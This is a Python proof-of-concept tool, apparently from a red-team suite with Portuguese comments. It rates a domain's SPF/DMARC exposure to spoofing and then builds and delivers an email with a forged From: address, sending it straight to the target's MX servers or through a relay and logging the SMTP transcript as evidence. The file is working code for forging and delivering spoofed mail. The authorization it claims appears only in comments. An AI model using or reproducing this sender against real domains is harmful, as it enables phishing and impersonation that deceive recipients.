#!/usr/bin/env python3
"""
email_spoof_poc.py — Evidência de exploração de SPF/DMARC/DKIM.

Sempre emite um verdito analítico de spoofing. Com --send (opt-in, atrás de
gate RoE), entrega um email forjado e captura o transcript SMTP como prova.

Uso de red team autorizado (RoE assinado). Console PT-BR; campos de evidência
em EN (padrão deliverable do suite).
"""
import argparse
import email.message
import email.utils
import os
import smtplib
import sys

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))


def compute_verdict(records, forged_from):
    """Mapeia status DNS → verdito de exploitabilidade de spoofing de From:."""
    spf = records["spf"]
    dmarc = records["dmarc"]
    dmarc_status = dmarc.get("status")
    dmarc_policy = dmarc.get("policy")

    if dmarc_status == "MISSING" or dmarc_policy == "none":
        status = "SPOOFABLE_INBOX"
        impact = "Forged From: of the exact domain is delivered to the inbox (DMARC absent or p=none)."
    elif dmarc_policy == "quarantine":
        status = "SPOOFABLE_SPAM"
        impact = "Forged mail is accepted but likely quarantined/spam-foldered (DMARC p=quarantine)."
    elif dmarc_policy == "reject":
        status = "BLOCKED_EXACT"
        impact = "Exact-domain spoofing blocked by DMARC p=reject; lookalike/cousin domains remain viable."
    else:
        status = "INDETERMINATE"
        impact = "DMARC policy unrecognized; manual review required."

    spf_note = None
    if spf.get("status") in ("MISSING", "PERMISSIVE", "NEUTRAL"):
        spf_note = "Envelope sender (MAIL FROM) is unprotected — eases envelope spoofing and backscatter."

    return {
        "status": status,
        "impact_en": impact,
        "spf_note_en": spf_note,
        "forged_envelope": {"mail_from": forged_from, "header_from": forged_from},
    }


def build_message(forged_from, to_addr, subject, body):
    """Monta o email forjado. Retorna (EmailMessage, message_id capturado)."""
    msg = email.message.EmailMessage()
    msg["From"] = forged_from
    msg["To"] = to_addr
    msg["Subject"] = subject
    msg["Date"] = email.utils.formatdate(localtime=True)
    msg_id = email.utils.make_msgid()
    msg["Message-ID"] = msg_id
    msg.set_content(body)
    return msg, msg_id


def parse_mx(dig_mx_output):
    """Parseia a saída de `dig +short MX` → lista de hosts ordenada por preferência."""
    hosts = []
    for line in dig_mx_output.splitlines():
        parts = line.split()
        if len(parts) == 2 and parts[0].isdigit():
            hosts.append((int(parts[0]), parts[1].rstrip(".")))
    hosts.sort()
    return [h for _, h in hosts]


def _decode(resp):
    return resp.decode(errors="replace") if isinstance(resp, (bytes, bytearray)) else str(resp)


def deliver_direct(mx_hosts, helo, mail_from, rcpt_to, msg_bytes,
                   timeout=15, smtp_factory=smtplib.SMTP):
    """Entrega direta na porta 25, tentando cada MX. Captura o transcript."""
    transcript = []
    last_err = None
    for host in mx_hosts:
        s = None
        try:
            s = smtp_factory(host, 25, timeout=timeout)
            transcript.append(f"CONNECT {host}:25")
            code, resp = s.ehlo(helo)
            transcript.append(f"EHLO {helo} -> {code} {_decode(resp)}")
            code, resp = s.mail(mail_from)
            transcript.append(f"MAIL FROM:<{mail_from}> -> {code} {_decode(resp)}")
            code, resp = s.rcpt(rcpt_to)
            transcript.append(f"RCPT TO:<{rcpt_to}> -> {code} {_decode(resp)}")
            code, resp = s.data(msg_bytes)
            transcript.append(f"DATA -> {code} {_decode(resp)}")
            s.quit()
            return {"method": "direct", "mx_used": host, "accepted": code == 250,
                    "transcript": transcript}
        except Exception as e:
            transcript.append(f"ERROR {host}: {e}")
            last_err = e
            if s is not None:
                try:
                    s.close()
                except Exception:
                    pass
            continue
    return {"method": "direct", "mx_used": None, "accepted": False,
            "transcript": transcript, "error": str(last_err) if last_err else None}


def deliver_relay(host, port, user, password, helo, mail_from, rcpt_to, msg_bytes,
                  timeout=15, smtp_factory=smtplib.SMTP):
    """Entrega via relay configurado (STARTTLS+login se user fornecido)."""
    transcript = []
    s = None
    try:
        s = smtp_factory(host, port, timeout=timeout)
        transcript.append(f"CONNECT relay {host}:{port}")
        code, resp = s.ehlo(helo)
        transcript.append(f"EHLO {helo} -> {code} {_decode(resp)}")
        if user:
            s.starttls()
            s.ehlo(helo)
            s.login(user, password)
            transcript.append("STARTTLS + AUTH")
        code, resp = s.mail(mail_from)
        transcript.append(f"MAIL FROM:<{mail_from}> -> {code} {_decode(resp)}")
        code, resp = s.rcpt(rcpt_to)
        transcript.append(f"RCPT TO:<{rcpt_to}> -> {code} {_decode(resp)}")
        code, resp = s.data(msg_bytes)
        transcript.append(f"DATA -> {code} {_decode(resp)}")
        s.quit()
        return {"method": "relay", "mx_used": host, "accepted": code == 250,
                "transcript": transcript}
    except Exception as e:
        transcript.append(f"ERROR relay {host}: {e}")
        if s is not None:
            try:
                s.close()
            except Exception:
                pass
        return {"method": "relay", "mx_used": host, "accepted": False,
                "transcript": transcript, "error": str(e)}
